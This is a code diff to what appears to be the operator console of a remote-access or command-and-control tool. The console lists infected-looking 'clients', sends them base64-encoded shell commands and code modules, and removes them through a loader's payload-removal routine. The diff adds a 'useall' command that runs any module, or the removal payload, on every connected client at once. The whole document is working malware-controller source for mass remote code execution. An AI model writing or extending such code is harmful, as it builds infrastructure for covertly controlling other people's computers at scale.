@@ -269,7 +269,8 @@ class View(urwid.Frame):
             self.output_view.add("clients          -   Show a list of clients.")
             self.output_view.add("connect <ID>     -   Connect to the client.")
             self.output_view.add("modules          -   Show a list of available modules.")
-            self.output_view.add("use <module>     -   Run the module on the client.")
+            self.output_view.add("use <module>     -   Run the module on the connected client.")
+            self.output_view.add("useall <module>  -   Run the module on every client.")
             self.output_view.add("kill <task_name> -   Kills the running task (background module).")
             if not self._current_client:
                 self.output_view.add("exit             -   Close the server and exit.")
@@ -322,6 +323,17 @@ class View(urwid.Frame):
 
                 for module_name, module_imp in modules.iteritems():
                     self.output_view.add("{0: <18} -   {1}".format(module_name, module_imp.info["Description"]))
+        elif command.startswith("useall"):
+            module_name = command.replace("useall ", "").strip()
+
+            if module_name == "useall":
+                self.output_view.add("Invalid module name (see \"modules\").", "attention")
+                self.output_view.add("Usage: useall <module>", "attention")
+            else:
+                if not self._model.has_clients():
+                    self.output_view.add("No available clients", "attention")
+                else:
+                    self.run_module(module_name, mass_execute=True)
         elif command == "clear":
             self.output_view.clear()
         elif command in ["q", "quit", "exit"] and not self._current_client:
@@ -351,52 +363,7 @@ class View(urwid.Frame):
                         self.output_view.add("Invalid module name (see \"modules\").", "attention")
                         self.output_view.add("Usage: use <module>", "attention")
                     else:
-                        if module_name in ["remove_client", "update_client"]:
-                            # Special modules used by loaders
-                            loader_name = self._current_client.loader_name
-                            loader = self._loader_factory.get_loaders()[loader_name]
-
-                            if module_name == "remove_client":
-                                self.output_view.add(
-                                    "Removing the client using the \"%s\" loader..." % loader_name,
-                                    "info"
-                                )
-
-                                self._model.send_command(Command(
-                                    self._current_client.id, base64.b64encode(loader.remove_payload()), "remove_client"
-                                ))
-
-                                self._model.remove_client(self._current_client.id)
-                                self.process_command("quit")
-                            elif module_name == "update_client":
-                                self.output_view.add(
-                                    "This module will be added at a later time, feel free to complain on GitHub.",
-                                    "attention"
-                                )
-                        else:
-                            try:
-                                module_imp = self._module_factory.get_module(module_name)
-                                module_view = _ModulePrompt(module_name, self._main_loop)
-                                successful = Queue()  # Stores the return value of the module_imp setup.
-
-                                self.footer = module_view
-
-                                # Starts the module view in it's own thread, needed since
-                                # otherwise calls to prompt will block the whole GUI.
-                                module_thread = threading.Thread(target=module_imp.setup,
-                                                                 args=(module_view, self.output_view, successful))
-                                module_thread.daemon = True
-                                module_thread.start()
-
-                                # Start a thread which waits for the module to finish setup.
-                                wait_thread = threading.Thread(target=self.module_wait,
-                                                               args=(
-                                                                   module_view, module_thread, successful, module_imp
-                                                               ))
-                                wait_thread.daemon = True
-                                wait_thread.start()
-                            except KeyError:
-                                self.output_view.add("That module doesn't exist!", "attention")
+                        self.run_module(module_name)
                 elif command.startswith("kill"):
                     # Kills a running task.
                     task_name = command.replace("kill ", "").strip()
@@ -421,7 +388,69 @@ class View(urwid.Frame):
                     self.output_view.add("Running command: " + command, "info")
                     self._model.send_command(Command(self._current_client.id, base64.b64encode(command)))
 
-    def module_wait(self, module_view, module_thread, successful, module_imp):
+    def run_module(self, module_name, mass_execute=False):
+        """Runs a module."""
+        if module_name in ["remove_client", "update_client"]:
+            # Special modules used by loaders
+            loader_name = self._current_client.loader_name
+            loader = self._loader_factory.get_loaders()[loader_name]
+
+            if module_name == "remove_client":
+                if mass_execute:
+                    clients = self._model.get_clients()
+
+                    self.output_view.add("Removing %s client(s) using the \"%s\" loader..." % (
+                            len(clients), loader_name
+                        ), "info")
+
+                    for client in clients:
+                        self._model.send_command(Command(
+                            client.id, base64.b64encode(loader.remove_payload()), "remove_client"
+                        ))
+
+                    if self._current_client in clients:
+                        self._model.remove_client(self._current_client.id)
+                        self.process_command("quit")
+                else:
+                    self.output_view.add("Removing the client using the \"%s\" loader..." % loader_name, "info")
+
+                    self._model.send_command(Command(
+                        self._current_client.id, base64.b64encode(loader.remove_payload()), "remove_client"
+                    ))
+
+                    self._model.remove_client(self._current_client.id)
+                    self.process_command("quit")
+            elif module_name == "update_client":
+                self.output_view.add(
+                    "This module will be added at a later time, feel free to complain on GitHub.",
+                    "attention"
+                )
+        else:
+            try:
+                module_imp = self._module_factory.get_module(module_name)
+                module_view = _ModulePrompt(module_name, self._main_loop)
+                successful = Queue()  # Stores the return value of the module_imp setup.
+
+                self.footer = module_view
+
+                # Starts the module view in it's own thread, needed since
+                # otherwise calls to prompt will block the whole GUI.
+                module_thread = threading.Thread(target=module_imp.setup,
+                                                 args=(module_view, self.output_view, successful))
+                module_thread.daemon = True
+                module_thread.start()
+
+                # Start a thread which waits for the module to finish setup.
+                wait_thread = threading.Thread(target=self._module_wait,
+                                               args=(
+                                                   module_view, module_thread, successful, module_imp, mass_execute
+                                               ))
+                wait_thread.daemon = True
+                wait_thread.start()
+            except KeyError:
+                self.output_view.add("That module doesn't exist!", "attention")
+
+    def _module_wait(self, module_view, module_thread, successful, module_imp, mass_execute=False):
         """Waits for the module setup to finish then sends the module to the client."""
         module_thread.join()  # Wait until the thread finishes.
         module_view.cleanup()
@@ -434,15 +463,28 @@ class View(urwid.Frame):
             module_code = base64.b64encode(dedent(module_imp.run()))
             is_task = module_imp.info["Task"]
 
-            self.output_view.add("Running module \"%s\"..." % module_view.module_name, "info")
-
             if is_task:
                 self.output_view.add("This module is a background task, use \"kill %s\" to stop it." %
                                      module_view.module_name, "info")
 
-            self._model.send_command(Command(
-                self._current_client.id, module_code, module_view.module_name, is_task
-            ))
+            if mass_execute:
+                # Run this module on every client.
+                clients = self._model.get_clients()
+
+                self.output_view.add("Running module \"%s\" on %s client(s)..." % (
+                    module_view.module_name, len(clients)
+                ), "info")
+
+                for client in clients:
+                    self._model.send_command(Command(
+                        client.id, module_code, module_view.module_name, is_task
+                    ))
+            else:
+                self.output_view.add("Running module \"%s\"..." % module_view.module_name, "info")
+
+                self._model.send_command(Command(
+                    self._current_client.id, module_code, module_view.module_name, is_task
+                ))
 
         self.async_reload()
 
